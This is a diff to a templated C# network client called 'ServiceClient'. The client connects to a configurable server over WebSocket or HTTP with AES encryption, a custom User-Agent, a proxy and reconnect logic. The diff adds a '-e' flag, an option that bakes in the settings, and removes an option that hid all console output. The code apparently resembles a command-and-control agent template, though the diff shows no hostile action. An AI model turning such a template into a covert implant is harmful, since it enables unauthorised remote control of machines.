@@ -17,13 +17,14 @@ namespace ServiceClient
         private const double RETRY_DURATION = {{ retry_duration }};
         private const int RETRY_ATTEMPTS = {{ retry_attempts }};
 
+{% if not no_arg_parsing %}
         private static void PrintHelp()
         {
             Console.WriteLine("Usage: ServiceClient [options]");
             Console.WriteLine();
             Console.WriteLine("Options:");
             Console.WriteLine("  --server-url <url>         Server URL to connect to");
-            Console.WriteLine("  --encryption-key <key>     AES encryption key");
+            Console.WriteLine("  -e, --encryption-key <key> AES encryption key");
             Console.WriteLine("  --user-agent <ua>          Custom User-Agent string");
             Console.WriteLine("  --proxy <url>              Proxy URL");
             Console.WriteLine("  --retry-duration <secs>    Total time to retry connecting");
@@ -44,6 +45,7 @@ namespace ServiceClient
                         Environment.Exit(0);
                         break;
                     case "--server-url":
+                    case "-e":
                     case "--encryption-key":
                     case "--user-agent":
                     case "--proxy":
@@ -54,7 +56,8 @@ namespace ServiceClient
                             Console.WriteLine($"[!] {args[i]} requires a value.");
                             break;
                         }
-                        parsed[args[i].Substring(2)] = args[++i];
+                        var key = args[i].StartsWith("--") ? args[i].Substring(2) : "encryption-key";
+                        parsed[key] = args[++i];
                         break;
                     default:
                         Console.WriteLine($"[!] Could not find argument `{args[i]}`.");
@@ -63,16 +66,14 @@ namespace ServiceClient
             }
             return parsed;
         }
+{% endif %}
 
         public static async Task Main(string[] args)
         {
-{% if no_print %}
-            Console.SetOut(TextWriter.Null);
-            Console.SetError(TextWriter.Null);
-{% endif %}
             ServicePointManager.ServerCertificateValidationCallback =
                 new RemoteCertificateValidationCallback(ValidateServerCertificate);
 
+{% if not no_arg_parsing %}
             var parsed = ParseArgs(args);
 
             string serverUrl = parsed.ContainsKey("server-url") && !string.IsNullOrEmpty(parsed["server-url"]) ? parsed["server-url"] : SERVER_URL;
@@ -87,6 +88,14 @@ namespace ServiceClient
             string proxyStr = parsed.ContainsKey("proxy") && !string.IsNullOrEmpty(parsed["proxy"]) ? parsed["proxy"] : PROXY;
             double retryDuration = parsed.ContainsKey("retry-duration") ? double.Parse(parsed["retry-duration"]) : RETRY_DURATION;
             int retryAttempts = parsed.ContainsKey("retry-attempts") ? int.Parse(parsed["retry-attempts"]) : RETRY_ATTEMPTS;
+{% else %}
+            string serverUrl = SERVER_URL;
+            byte[] encryptionKey = Crypto.Hash(ENCRYPTION_KEY);
+            string userAgent = USER_AGENT;
+            string proxyStr = PROXY;
+            double retryDuration = RETRY_DURATION;
+            int retryAttempts = RETRY_ATTEMPTS;
+{% endif %}
 
             IWebProxy proxy = null;
             if (!string.IsNullOrEmpty(proxyStr))
@@ -118,12 +127,10 @@ namespace ServiceClient
 
                 if (scheme.Contains("ws"))
                 {
-                    Console.WriteLine($"[*] Attempting to connect over {scheme.ToUpper()} ({i + 1}/{schemes.Length})");
                     client = new WsServiceClient(candidateUrl, encryptionKey, userAgent, proxy);
                 }
                 else if (scheme.Contains("http"))
                 {
-                    Console.WriteLine($"[*] Attempting to connect over {scheme.ToUpper()} ({i + 1}/{schemes.Length})");
                     client = new HttpServiceClient(candidateUrl, encryptionKey, userAgent, proxy);
                 }
                 else
@@ -132,6 +139,7 @@ namespace ServiceClient
                     continue;
                 }
 
+                Console.WriteLine($"[*] Attempting to connect over {scheme.ToUpper()} to {candidateUrl} ({i + 1}/{schemes.Length})");
                 try
                 {
                     await client.ConnectAsync();
@@ -186,7 +194,7 @@ namespace ServiceClient
                 while (consecutiveFailures < retryAttempts)
                 {
                     consecutiveFailures++;
-                    Console.WriteLine($"[*] Attempting to reconnect (attempt {consecutiveFailures}/{retryAttempts})");
+                    Console.WriteLine($"[*] Attempting to reconnect ({consecutiveFailures}/{retryAttempts})");
                     await Task.Delay(sleepInterval);
 
                     try
